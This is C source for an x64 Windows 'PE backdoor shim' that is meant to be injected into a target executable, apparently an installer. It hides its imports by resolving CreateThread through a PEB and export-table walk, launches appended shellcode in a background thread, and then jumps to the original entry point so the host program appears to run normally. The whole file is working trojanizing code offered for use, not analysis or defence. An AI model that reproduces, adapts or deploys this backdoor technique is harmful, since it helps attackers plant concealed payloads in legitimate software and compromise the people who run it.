/*
 * pe_stub_x64.c — PE backdoor shim (x64)
 *
 * Section layout when injected into target PE:
 *   +0x000 : ShimEntry (this code, must be first)
 *   +0x1F0 : stub_magic  = 0xCAFEBABEDEADBEEF  (locator, 8 bytes)
 *   +0x1F8 : oep_rva     = 0                    (patched by patcher.py, 8 bytes)
 *   +0x200 : shellcode payload                  (appended by patcher.py)
 *
 * Shellcode VA at runtime: &stub_magic + 0x10  (= section_va + 0x200)
 * OEP VA at runtime:       image_base  + oep_rva
 * image_base is read from PEB+0x10 to handle ASLR correctly.
 *
 * CreateThread is resolved via PEB module walk + PE export table search.
 * No external imports — stub is fully self-contained in the injected section.
 *
 * Compiled by patcher.py:
 *   x86_64-w64-mingw32-gcc -Os -fno-stack-protector -nostdlib -nostartfiles
 *     -ffreestanding -fno-exceptions -fno-asynchronous-unwind-tables
 *     -fomit-frame-pointer -fno-ident -fno-toplevel-reorder
 *     -Wl,-T,pe_stub.ld pe_stub_x64.c -o pe_stub_x64.bin
 */

typedef unsigned long long u64;
typedef unsigned int       u32;
typedef unsigned short     u16;

/* Placed at 0x1F0 via linker script — patched by patcher.py at 0x1F8 */
volatile u64 stub_magic = 0xCAFEBABEDEADBEEFULL;
volatile u64 oep_rva    = 0;

/* ── helpers ─────────────────────────────────────────────────────────────── */

static __inline__ char *_peb(void)
{
    char *v;
    __asm__ volatile ("movq %%gs:0x60, %0" : "=r"(v));
    return v;
}

/* PEB+0x10 = ImageBaseAddress (handles ASLR) */
static __inline__ char *_imgbase(void)
{
    return *(char **)(_peb() + 0x10);
}

/*
 * InMemoryOrderModuleList walk: [0]=exe [1]=ntdll [2]=kernel32
 * Each entry's InMemoryOrderLinks is a LIST_ENTRY embedded at +0x10 of
 * LDR_DATA_TABLE_ENTRY; DllBase sits at +0x20 past the LIST_ENTRY pointer.
 */
static char *_k32base(void)
{
    char *ldr   = *(char **)(_peb() + 0x18);
    char *entry = *(char **)(ldr + 0x20);   /* exe   */
         entry  = *(char **)entry;           /* ntdll */
         entry  = *(char **)entry;           /* kernel32 */
    return *(char **)(entry + 0x20);
}

static int _seq(const char *a, const char *b)
{
    while (*a && *a == *b) { a++; b++; }
    return *a == *b;
}

/*
 * Export table walk.  Works for x64 PE32+ optional header:
 *   NT header at base+[base+0x3C]
 *   DataDirectory[0] (exports) at NT+0x88 (= NT+0x18+0x70)
 */
static void *_getproc(char *base, const char *name)
{
    u32  peoff = *(u32 *)(base + 0x3C);
    char *pe   = base + peoff;
    u32  erva  = *(u32 *)(pe + 0x88);
    char *exp  = base + erva;
    u32  nn    = *(u32 *)(exp + 0x18);
    u32 *an    = (u32 *)(base + *(u32 *)(exp + 0x20));
    u16 *ao    = (u16 *)(base + *(u32 *)(exp + 0x24));
    u32 *af    = (u32 *)(base + *(u32 *)(exp + 0x1C));
    for (u32 i = 0; i < nn; i++)
        if (_seq(base + an[i], name))
            return base + af[ao[i]];
    return (void *)0;
}

typedef void *(*ct_fn)(void *, u64, void *, void *, u32, u32 *);

/* ── entry point — must stay first in .text (enforced by -fno-toplevel-reorder) */

void ShimEntry(void)
{
    char *img = _imgbase();
    char *k32 = _k32base();

    ct_fn ct = (ct_fn)_getproc(k32, "CreateThread");

    /*
     * stub_magic is at section_offset 0x1F0.
     * Shellcode is at section_offset 0x200 = stub_magic + 0x10.
     * This RIP-relative address is resolved correctly after ASLR rebasing.
     */
    void *sc = (char *)&stub_magic + 0x10;

    if (ct)
        ct((void *)0, (u64)0, sc, (void *)0, (u32)0, (u32 *)0);

    /* Jump to original OEP — installer runs normally */
    void *oep = img + oep_rva;
    __asm__ volatile ("jmp *%0" :: "r"(oep) : "memory");
    __builtin_unreachable();
}
